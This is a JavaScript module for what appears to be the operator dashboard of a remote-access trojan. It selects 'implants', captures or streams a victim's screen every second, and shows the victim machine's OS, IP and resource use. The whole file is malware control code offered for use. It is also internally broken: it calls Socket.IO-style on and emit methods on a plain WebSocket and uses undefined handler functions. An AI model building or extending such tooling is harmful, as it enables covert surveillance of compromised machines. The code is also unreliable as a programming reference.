// Remote Control Module
const RemoteControl = {
    socket: null,
    selectedImplant: null,
    screenStreamInterval: null,
    isStreaming: false,

    init(socket) {
        this.socket = socket;
        this.setupEventListeners();
    },

    setupEventListeners() {
        // Screen capture buttons
        document.getElementById('capture-screen').addEventListener('click', () => this.captureScreen());
        document.getElementById('start-stream').addEventListener('click', () => this.startScreenStream());
        document.getElementById('stop-stream').addEventListener('click', () => this.stopScreenStream());

        // Socket event listeners
        this.socket.on('screen_capture', this.handleScreenCapture.bind(this));
        this.socket.on('system_metrics', this.updateSystemMetrics.bind(this));
    },

    selectImplant(implantId) {
        this.selectedImplant = implantId;
        this.updateSystemInfo();
    },

    captureScreen() {
        if (!this.selectedImplant) {
            dashboard.showNotification('Please select an implant first', 'warning');
            return;
        }

        this.socket.emit('capture_screen', {
            implant_id: this.selectedImplant
        });
    },

    startScreenStream() {
        if (!this.selectedImplant) {
            dashboard.showNotification('Please select an implant first', 'warning');
            return;
        }

        if (this.isStreaming) {
            dashboard.showNotification('Screen stream is already active', 'info');
            return;
        }

        this.isStreaming = true;
        this.screenStreamInterval = setInterval(() => {
            this.captureScreen();
        }, 1000); // Capture every second

        dashboard.showNotification('Screen stream started', 'success');
    },

    stopScreenStream() {
        if (!this.isStreaming) {
            dashboard.showNotification('No active screen stream', 'info');
            return;
        }

        clearInterval(this.screenStreamInterval);
        this.isStreaming = false;
        dashboard.showNotification('Screen stream stopped', 'info');
    },

    handleScreenCapture(data) {
        const screenView = document.getElementById('screen-capture');
        screenView.src = `data:image/${data.format};base64,${data.image_data}`;
    },

    updateSystemMetrics(metrics) {
        document.getElementById('cpu-usage').textContent = `${metrics.cpu}%`;
        document.getElementById('memory-usage').textContent = `${metrics.memory}%`;
        
        // Update system info
        document.getElementById('os-info').textContent = metrics.os;
        document.getElementById('ip-info').textContent = metrics.ip;
        document.getElementById('last-seen').textContent = dashboard.formatDate(metrics.timestamp);
    },

    updateSystemInfo() {
        if (!this.selectedImplant) return;

        this.socket.emit('get_system_info', {
            implant_id: this.selectedImplant
        });
    }
};

// Initialize when document is ready
document.addEventListener('DOMContentLoaded', () => {
    // Initialize WebSocket connection
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const socket = new WebSocket(`${protocol}//${window.location.host}/ws/dashboard`);

    // Handle WebSocket messages
    socket.onmessage = (event) => {
        const data = JSON.parse(event.data);
        if (data.type === 'screen_capture') {
            updateScreenCapture(data);
        } else if (data.type === 'system_info') {
            updateSystemInfo(data);
        }
    };

    RemoteControl.init(socket);
}); 